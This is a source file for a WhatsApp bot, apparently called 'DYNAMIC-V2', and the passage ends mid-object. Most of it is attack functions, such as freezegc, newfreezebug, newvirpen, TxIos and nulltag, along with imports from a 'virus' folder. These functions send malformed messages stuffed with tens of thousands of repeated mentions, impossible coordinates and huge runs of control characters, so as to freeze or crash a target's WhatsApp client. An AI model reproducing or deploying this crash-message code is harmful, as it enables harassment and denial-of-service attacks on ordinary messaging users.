module.exports = async (sam, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const time = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('HH:mm:ss z')
const botNumber = await sam.decodeJid(sam.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const from = m.key.remoteJid
const sender = m.key.fromMe ? (sam.user.id.split(':')[0]+'@s.whatsapp.net' || sam.user.id) : (m.key.participant || m.key.remoteJid)
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await sam.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const fetch = require('node-fetch');
const { runtime, getRandom, isUrl, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./doc/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./doc/converter.js")
const speed = require("performance-now")
//===============================[[[=[========
	const pic = fs.readFileSync(`./Media/dynamic.jpg`)
		const music = fs.readFileSync(`./Media/menu.mp3`)
		const bug = fs.readFileSync(`./Media/bug.mp3`)	
const { ngazap } = require('./virus/ngazap')
const { crash } = require('./virus/crash')
const { buttonkal } = require('./virus/buttonkal')
const { cttl } = require('./virus/cttl')
const { tizi } = require('./virus/tizi')
const { weg } = require('./virus/weg')
const { virus7 } = require('./virus/virus7')
const { notif3 } = require("./virus/notif3")
const { notif4 } = require("./virus/notif4")
//========================================
const GIST_URL = 'https://api.github.com/gists/db44ee99cf5ccecc018c8c8c20398daf'; // Replace with your Gist ID
const userNumber = await sam.decodeJid(sam.user.id);

// Set the allowed access time in days
const accessDurationInDays = 1; // Set your desired number of days here
const accessStartTime = new Date('2023-10-01T00:00:00Z'); // Set your start date and time here
const currentTime = new Date();

// Calculate the access duration in milliseconds
const accessDuration = accessDurationInDays * 24 * 60 * 60 * 1000; // Convert days to milliseconds

async function checkAccess(userNumber) {
    try {
        // Check if the current time is within the allowed access duration
        const accessEndTime = new Date(accessStartTime.getTime() + accessDuration);
        if (currentTime > accessEndTime) {
            console.error('Access denied: Time limit has expired.dm t.me/The_Chosen_001 to add time');
            process.exit(); // Exit the process with a failure code
        }

        const response = await fetch(GIST_URL);
        const gistData = await response.json();

        // Check if 'dyna.js' exists in gistData.files
        if (gistData.files && gistData.files['dyna.js']) {
            const dynavipContent = gistData.files['dyna.js'].content;
            const dynavip = JSON.parse(dynavipContent).dynavip;

            if (dynavip.includes(userNumber)) {
                console.log('Access granted. You can now use the bot...');
                // Place your main code here
            } else {
                console.error('Access denied: User number not allowed. DM t.me/The_Chosen_001.');
                process.exit(); // Exit the process with a failure code
            }
        } else {
            console.error('Access denied: Configuration file missing.');
            process.exit(); // Exit the process with a failure code
        }
    } catch (error) {
        console.error(error.message);
        process.exit(); // Exit the process with a failure code
    }
}

// Assuming sam is defined and has a valid user.id
checkAccess(userNumber);
//========================================

const reply = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2 🕷️ `,
                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: `https://i.imgur.com/xdt2g23.jpeg`,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
        quoted: m
    })
    await sleep(500)
}

		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: pic,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
//============
        const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await rzx.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
        }

//=========================================//

if (isCmd) {
console.log("");
console.log(chalk.green(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.blue(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}
//==========================================//
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

     async function caroLoc(target, pic, Ptcp = true ) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌TRY 💔‌" + "@null".repeat(13000),
            sequenceNumber: "0",
            jpegThumbnail: pic
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: EsQl
    });
    await sam.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
  //=======================
 async function Sinvi(target, Ptcp = true) {
     const userMention = {

        "type": "user",

        "userJid": target,

        "mention": "@" + target.split('@')[0], // This assumes the display name is the part before '@'

    };
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "🌑samMIC💀",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "🌑samMIC💀\n" + userMention.mention.repeat(17000),
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: EsQl 
   });

   await sam.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By Spider V9〽️"));
  };   
  async function freezegc(target) {		
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄 " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2 🏴‍☠️"
}
}
};
async function freezekamoflase(target) {

    await sam.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function caltx(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐃𝐘𝐍𝐀 𝐕2 🦄" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
		
async function freezeuii(target) {

    await sam.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function freezeui(target) {

    await sam.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        viewOnceMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0 
                        },
                        hasMediaAttachment: false
                    },
                    body: {
                        text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🦄 ${"@254742491666 ".repeat(10000)}`,
           "contextInfo": { mentionedJid: [ "254742491666@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "254742491666@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await sam.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function newfreezebug(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 🔐";

    await sam.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄" + "@sammicv2".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@null"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await sam.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TxIos(target, Ptcp = false) {
			await sam.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐃𝐘𝐍𝐀𝐌𝐈𝐂⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"issampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug "));
		};
    //========================
    async function nulltag(target, ptcp = false) {
			await sam.relayMessage(target, {
					extendedTextMessage: {
						text: "‎samMIC-V2\n" + "~@0~\n".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@null",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@null`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@null",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@null",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " p ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
